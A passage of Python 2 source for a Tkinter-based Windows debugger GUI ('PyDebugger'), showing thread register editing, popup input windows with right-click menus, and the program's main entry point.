                thread_context = dbg.get_thread_context(thread_handle)
                print("[+] New EDI value[Thread %s]: 0x%08x" % (thread_id, thread_context.Edi))
            dbg.resume_all_threads()
        elif register == "ESP":
            for thread_id in dbg.enumerate_threads():
                thread_handle  = dbg.open_thread(thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                thread_context.Esp = content
                dbg.set_thread_context(thread_context,0,thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                print("[+] New ESP value[Thread %s]: 0x%08x" % (thread_id, thread_context.Esp))
            dbg.resume_all_threads()
        elif register == "EBP":
            for thread_id in dbg.enumerate_threads():
                thread_handle  = dbg.open_thread(thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                thread_context.Ebp = content
                dbg.set_thread_context(thread_context,0,thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                print("[+] New EBP value[Thread %s]: 0x%08x" % (thread_id, thread_context.Ebp))
            dbg.resume_all_threads()
        elif register == "EIP":
            for thread_id in dbg.enumerate_threads():
                thread_handle  = dbg.open_thread(thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                thread_context.Eip = content
                dbg.set_thread_context(thread_context,0,thread_id)
                thread_context = dbg.get_thread_context(thread_handle)
                print("[+] New EIP value[Thread %s]: 0x%08x" % (thread_id, thread_context.Eip))
            dbg.resume_all_threads()
        else:
            print "[-] Error"       #This should never happen
        return True
        

    def onSelect(self, val):
        sender = val.widget
        idx = sender.curselection()
        self.value = sender.get(idx)   
        self.type = self.value
        self.var.set(self.value)

class popupWindowHEX(object):
    
    def __init__(self,master):
        top=self.top=Toplevel(master)
        self.top.geometry("10x80+300+300")
        self.l=Label(top,text="Blocksize:")
        self.l.pack()
        self.e=Entry(top)
        self.e.pack()
        self.e.insert(0,1024)
        self.b=Button(top,text='Done',command=self.cleanup)
        self.b.pack()
        #clipboard = self.clip()
        #clipboard = clipboard.replace("", "\")
        # delete the selected text, if any
        #try:
        #    start = self.e.index("sel.first")
        #    end = self.e.index("sel.last")
        #    self.e.delete(start, end)
        #except TclError, e:
        #    # nothing was selected, so paste doesn't need
        #    # to delete anything
        #    pass
        #self.e.insert("insert", clipboard)
        #self.e.pack()
        #self.b=Button(top,text='Ok',command=self.cleanup)
        #self.b.pack()

    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass

        
    def cleanup(self):
        print "[*]\tDestroying Bloacksize window(If you entered nothing, expect an error)"
        self.value=data = self.e.get()
        self.top.destroy()
        print "[+]\t\tAdded shellcode: %s" % self.value
        print "[*]Hit Start or select  a different engine from the debug menu"

class popupWindowDISS(object):
    
    def __init__(self,master):
        top=self.top=Toplevel(master)
        self.top.geometry("10x80+300+300")
        self.l=Label(top,text="Address:")
        self.l.pack()
        self.e=Entry(top)
        self.e.pack()
        self.b=Button(top,text='Done',command=self.cleanup)
        self.b.pack()
        #clipboard = self.clip()
        #clipboard = clipboard.replace("", "\")
        # delete the selected text, if any
        #try:
        #    start = self.e.index("sel.first")
        #    end = self.e.index("sel.last")
        #    self.e.delete(start, end)
        #except TclError, e:
        #    # nothing was selected, so paste doesn't need
        #    # to delete anything
        #    pass
        #self.e.insert("insert", clipboard)
        #self.e.pack()
        #self.b=Button(top,text='Ok',command=self.cleanup)
        #self.b.pack()

    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass

        
    def cleanup(self):
        print "[*]\tDestroying Dissasem around window(If you entered nothing, expect an error)"
        self.value=data = self.e.get()
        self.top.destroy()
        print "[+]\t\tAdded shellcode: %s" % self.value
        print "[*]Hit Start or select  a different engine from the debug menu"

class popupWindowSearchMemory(object):
    
    def __init__(self,master):
        top=self.top=Toplevel(master)
        self.top.geometry("10x80+300+300")
        self.l=Label(top,text="String:")
        self.l.pack()
        self.e=Entry(top)
        self.e.pack()
        self.b=Button(top,text='Done',command=self.cleanup)
        self.b.pack()
        
    def rClicker(self,e):
        ''' right click context menu for all Tk Entry and Text widgets
        '''

        try:
            def rClick_Copy(e, apnd=0):
                e.widget.event_generate('<Control-c>')

            def rClick_Cut(e):
                e.widget.event_generate('<Control-x>')

            def rClick_Paste(e):
                e.widget.event_generate('<Control-v>')

            e.widget.focus()

            nclst=[
                   (' Cut', lambda e=e: rClick_Cut(e)),
                   (' Copy', lambda e=e: rClick_Copy(e)),
                   (' Paste', lambda e=e: rClick_Paste(e)),
                   ]

            rmenu = Menu(None, tearoff=0, takefocus=0)

            for (txt, cmd) in nclst:
                rmenu.add_command(label=txt, command=cmd)

            rmenu.tk_popup(e.x_root+40, e.y_root+10,entry="0")

        except TclError:
            print ' - rClick menu, something wrong'
            pass

        return "break"
    
    def rClickbinder(self,r):

        try:
            for b in [ 'Text', 'Entry', 'Listbox', 'Label']: #
                r.bind_class(b, sequence='<Button-3>',
                         func=self.rClicker, add='')
        except TclError:
            print ' - rClickbinder, something wrong'
            pass

        
    def cleanup(self):
        print "[*]\tDestroying Dissasem around window(If you entered nothing, expect an error)"
        self.value=data = self.e.get()
        self.top.destroy()
        print "[+]\t\tAdded shellcode: %s" % self.value
        print "[*]Hit Start or select  a different engine from the debug menu"

def main():
    root = Tk()
    look = os.path.isfile('grade.ico')
    if (look == True):
        root.iconbitmap(default='grade.ico')
    else:
        pass
    root.geometry("750x450+300+300")
    print "[==Welcome to PyDebugger====]"
    print "[===Written by Starwarsfan2099]"
    print "[======Version: 3.1-1=========]"
    print "[====Check out github.com/Starwarsfan2099 for more great tools]"
    print "Help, errors, and other info will be displayed here(Plus the same info displayed in the main windows)"
    app = Example(root)
    root.mainloop()


if __name__ == '__main__':
    main()  
